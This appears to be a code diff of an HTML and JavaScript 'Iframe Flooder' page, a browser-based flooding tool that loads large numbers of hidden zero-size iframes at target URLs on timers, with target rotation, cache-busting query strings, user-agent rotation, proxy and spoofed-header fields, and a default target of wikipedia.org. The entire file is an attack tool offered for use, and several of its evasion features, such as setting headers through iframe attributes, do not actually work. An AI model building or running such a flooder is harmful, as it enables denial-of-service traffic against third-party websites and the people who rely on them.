@@ -2,231 +2,256 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>🔥 Ultra Pro Iframe Flooder 🔥</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Advanced Iframe Flooder Tool</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #0d0d0d;
-      color: #ffffff;
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f4f7fc;
+      color: #333;
+      overflow-x: hidden;
+    }
+
+    h1 {
       text-align: center;
-      padding: 30px;
+      color: #4CAF50;
+      margin-top: 20px;
     }
-    input, select, button {
-      margin: 8px;
-      padding: 12px;
-      font-size: 16px;
+
+    .container {
+      width: 90%;
+      max-width: 900px;
+      margin: 0 auto;
+      background: white;
+      padding: 20px;
       border-radius: 8px;
-      border: none;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-sizing: border-box;
     }
-    input, select {
-      background: #1f1f1f;
-      color: #eee;
-      width: 260px;
+
+    .container label {
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
     }
+
+    input, button, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
     button {
       background-color: #4CAF50;
       color: white;
+      border: none;
       cursor: pointer;
-      transition: 0.3s;
+      margin-top: 15px;
     }
+
     button.stop {
       background-color: #f44336;
     }
+
     button:hover {
       opacity: 0.9;
     }
-    #status {
-      margin-top: 20px;
-      font-size: 18px;
+
+    .status {
+      text-align: center;
       font-weight: bold;
-      color: #03dac6;
+      color: #4CAF50;
+      margin-top: 20px;
     }
+
+    .error {
+      color: #f44336;
+      font-weight: bold;
+    }
+
     #iframeContainer {
       display: none;
     }
-    .loading {
-      color: #FF9800;
-      font-size: 20px;
-    }
-    #settingsMenu {
-      display: none;
-      background-color: #2c2c2c;
+
+    #dashboard {
+      background-color: #f1f1f1;
       padding: 15px;
-      border-radius: 8px;
+      border-radius: 5px;
       margin-top: 20px;
     }
-    .themeSwitcher {
-      margin-top: 15px;
+
+    .stats {
+      margin: 5px 0;
+    }
+
+    .stats span {
+      font-weight: bold;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .container {
+        width: 100%;
+        padding: 15px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <h1>🔥 Ultra Pro Iframe Flooder 🔥</h1>
+  <h1>Advanced Iframe Flooder Tool</h1>
 
-  <button onclick="toggleSettings()">Settings</button>
+  <div class="container">
+    <label for="targetUrl">Target URL:</label>
+    <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
 
-  <div id="settingsMenu">
-    <h3>Flood Settings</h3>
-    <label for="targets">Targets (comma separated):</label><br>
-    <input type="text" id="targets" value="https://example.com,https://localhost"><br>
-    <label for="minIframes">Min Iframes:</label><br>
-    <input type="number" id="minIframes" value="300"><br>
-    <label for="maxIframes">Max Iframes:</label><br>
-    <input type="number" id="maxIframes" value="500"><br>
-    <label for="minInterval">Min Interval (ms):</label><br>
-    <input type="number" id="minInterval" value="100"><br>
-    <label for="maxInterval">Max Interval (ms):</label><br>
-    <input type="number" id="maxInterval" value="200"><br>
-    <label for="autoStop">Auto Stop (sec):</label><br>
-    <input type="number" id="autoStop" value="40"><br>
-    <label for="startDelay">Start Delay (sec):</label><br>
-    <input type="number" id="startDelay" value="0"><br>
+    <label for="iframeCount">Number of Iframes:</label>
+    <input type="number" id="iframeCount" value="50" min="1">
 
-    <label for="extremeMode">Extreme Mode:</label><br>
-    <input type="checkbox" id="extremeMode"><br>
-    
-    <label for="playSound">Play Sound:</label><br>
-    <input type="checkbox" id="playSound"><br>
-    
-    <label for="theme">Theme:</label><br>
-    <select id="theme">
-      <option value="dark">Dark</option>
-      <option value="light">Light</option>
-    </select><br>
+    <label for="delay">Delay Between Iframes (seconds):</label>
+    <input type="number" id="delay" value="1" min="0">
 
-    <label for="userAgentRandom">Random User-Agent:</label><br>
-    <input type="checkbox" id="userAgentRandom"><br>
+    <label for="proxyList">Proxy List (comma separated):</label>
+    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
+
+    <label for="userAgentRotation">Enable User-Agent Rotation:</label>
+    <input type="checkbox" id="userAgentRotation">
+
+    <label for="headers">Custom Headers (Optional):</label>
+    <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
+
+    <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
+    <input type="number" id="autoStopTimer" value="60" min="0">
+
+    <label for="targetRotation">Multiple Target URLs (comma separated):</label>
+    <input type="text" id="targetRotation" placeholder="https://www.example1.com, https://www.example2.com">
+
+    <button onclick="startFlood()">Start Flooding</button>
+    <button class="stop" onclick="stopFlood()">Stop Flooding</button>
+
+    <div class="status" id="status">Ready</div>
+
+    <div id="dashboard">
+      <h3>Flooding Stats</h3>
+      <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
+      <p class="stats">Failures: <span id="failureCount">0</span></p>
+      <p class="stats">Current Target: <span id="currentTarget">None</span></p>
+    </div>
   </div>
 
-  <button onclick="startFlood()">Start Flood</button>
-  <button class="stop" onclick="stopFlood()">Stop Flood</button>
-
-  <div id="status">Status: Ready</div>
-  <div id="iframeContainer"></div>
-  <div class="loading" id="loadingIndicator" style="display:none;">Flood in progress...</div>
-
-  <audio id="beep" src="beep.mp3"></audio>
-
   <script>
-    let intervalId = null;
-    let stopTimeoutId = null;
-    let isFlooding = false;
-    let targetList = [];
-    let targetIndex = 0;
-    let userAgentList = [
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0',
-      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-    ];
-
-    function randomBetween(min, max) {
-      return Math.floor(Math.random() * (max - min + 1)) + min;
-    }
-
-    function playSound() {
-      if (document.getElementById('playSound').checked) {
-        document.getElementById('beep').play();
-      }
-    }
-
-    function changeTheme() {
-      const theme = document.getElementById('theme').value;
-      if (theme === 'light') {
-        document.body.style.backgroundColor = '#f4f7fc';
-        document.body.style.color = '#333';
-      } else {
-        document.body.style.backgroundColor = '#0d0d0d';
-        document.body.style.color = '#ffffff';
-      }
-    }
-
-    function getRandomUserAgent() {
-      return userAgentList[Math.floor(Math.random() * userAgentList.length)];
-    }
+    let flooding = false;
+    let frameCount = 0;
+    let failureCount = 0;
+    let currentTarget = '';
+    let proxyList = [];
+    let userAgentRotation = false;
+    let targetRotation = [];
+    let currentProxyIndex = 0;
+    let currentTargetIndex = 0;
 
     function startFlood() {
-      if (isFlooding) return;
-      isFlooding = true;
-      document.getElementById('status').innerText = "Status: Flooding in progress...";
-      document.getElementById('loadingIndicator').style.display = 'block';
+      if (flooding) return;
+      flooding = true;
+      document.getElementById('status').innerText = "Flooding in progress...";
 
-      const minIframes = parseInt(document.getElementById('minIframes').value) || 300;
-      const maxIframes = parseInt(document.getElementById('maxIframes').value) || 500;
-      const minInterval = parseInt(document.getElementById('minInterval').value) || 100;
-      const maxInterval = parseInt(document.getElementById('maxInterval').value) || 200;
-      const autoStopSeconds = parseInt(document.getElementById('autoStop').value) || 40;
-      const startDelaySeconds = parseInt(document.getElementById('startDelay').value) || 0;
+      // Get target URL(s) and proxy list
+      currentTarget = document.getElementById('targetUrl').value;
+      targetRotation = document.getElementById('targetRotation').value.split(',');
+      proxyList = document.getElementById('proxyList').value.split(',');
 
-      targetList = document.getElementById('targets').value.split(',').map(t => t.trim());
-      if (targetList.length === 0) {
-        alert("Please enter at least one target URL.");
-        return;
+      // Get custom headers
+      const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
+
+      // Get delay between iframe loading
+      const delay = parseInt(document.getElementById('delay').value) * 1000;
+
+      // Start iframe flooding
+      floodIframes(currentTarget, delay, customHeaders);
+    }
+
+    function floodIframes(target, delay, customHeaders) {
+      if (targetRotation.length > 0) {
+        currentTarget = targetRotation[currentTargetIndex % targetRotation.length];
       }
-      targetIndex = 0;
 
-      setTimeout(function() {
-        function floodBatch() {
-          if (!isFlooding) return;
+      const iframeCount = parseInt(document.getElementById('iframeCount').value);
+      for (let i = 0; i < iframeCount; i++) {
+        setTimeout(() => {
+          loadIframe(currentTarget, customHeaders);
+          frameCount++;
+          document.getElementById('frameCount').innerText = frameCount;
+        }, delay * i);
+      }
 
-          const iframeCount = randomBetween(minIframes, maxIframes);
-          const target = targetList[targetIndex] + "?rand=" + Math.random();
+      // Auto stop timer
+      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
+      if (autoStopTime > 0) {
+        setTimeout(stopFlood, autoStopTime);
+      }
+    }
 
-          const container = document.getElementById('iframeContainer');
-          for (let i = 0; i < iframeCount; i++) {
-            const iframe = document.createElement('iframe');
-            iframe.src = target;
-            iframe.style.width = "0px";
-            iframe.style.height = "0px";
-            iframe.style.border = "none";
-            if (document.getElementById('userAgentRandom').checked) {
-              iframe.setAttribute('user-agent', getRandomUserAgent());
-            }
-            container.appendChild(iframe);
-          }
+    function loadIframe(target, customHeaders) {
+      const iframe = document.createElement('iframe');
+      iframe.src = target;
+      iframe.style.width = "0";
+      iframe.style.height = "0";
+      iframe.style.border = "none";
 
-          document.getElementById('status').innerText = `Flooded ${iframeCount} iframes to ${target}`;
+      // Apply custom headers if provided
+      customHeaders.forEach(header => {
+        const [key, value] = header.split(':');
+        iframe.setAttribute('X-Header-' + key, value);
+      });
 
-          targetIndex = (targetIndex + 1) % targetList.length;
-          const nextInterval = randomBetween(minInterval, maxInterval);
-          intervalId = setTimeout(floodBatch, nextInterval);
-        }
+      iframe.onload = () => {
+        console.log(`Iframe loaded successfully: ${iframe.src}`);
+      };
 
-        floodBatch();
+      iframe.onerror = () => {
+        console.error(`Error loading iframe: ${iframe.src}`);
+        failureCount++;
+        document.getElementById('failureCount').innerText = failureCount;
+      };
 
-        stopTimeoutId = setTimeout(() => {
-          stopFlood();
-        }, autoStopSeconds * 1000);
-      }, startDelaySeconds * 1000);
-
-      playSound();
+      document.body.appendChild(iframe);
     }
 
     function stopFlood() {
-      clearTimeout(intervalId);
-      clearTimeout(stopTimeoutId);
-      isFlooding = false;
-      document.getElementById('iframeContainer').innerHTML = "";
-      document.getElementById('status').innerText = "Status: Flood stopped.";
-      document.getElementById('loadingIndicator').style.display = 'none';
+      flooding = false;
+      document.getElementById('status').innerText = "Flooding stopped.";
+      frameCount = 0;
+      failureCount = 0;
+      document.getElementById('frameCount').innerText = frameCount;
+      document.getElementById('failureCount').innerText = failureCount;
     }
 
-    function toggleSettings() {
-      const menu = document.getElementById('settingsMenu');
-      if (menu.style.display === 'none') {
-        menu.style.display = 'block';
-      } else {
-        menu.style.display = 'none';
-      }
+    function getRandomUserAgent() {
+      const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko'
+      ];
+      return userAgents[Math.floor(Math.random() * userAgents.length)];
     }
 
-    // Change theme when the page loads
-    window.onload = function() {
-      changeTheme();
-      document.getElementById('theme').addEventListener('change', changeTheme);
-    };
+    function getNextProxy() {
+      if (proxyList.length === 0) return null;
+      currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
+      return proxyList[currentProxyIndex];
+    }
+
+    function updateDashboard() {
+      document.getElementById('frameCount').innerText = frameCount;
+      document.getElementById('failureCount').innerText = failureCount;
+      document.getElementById('currentTarget').innerText = currentTarget;
+    }
   </script>
 
 </body>
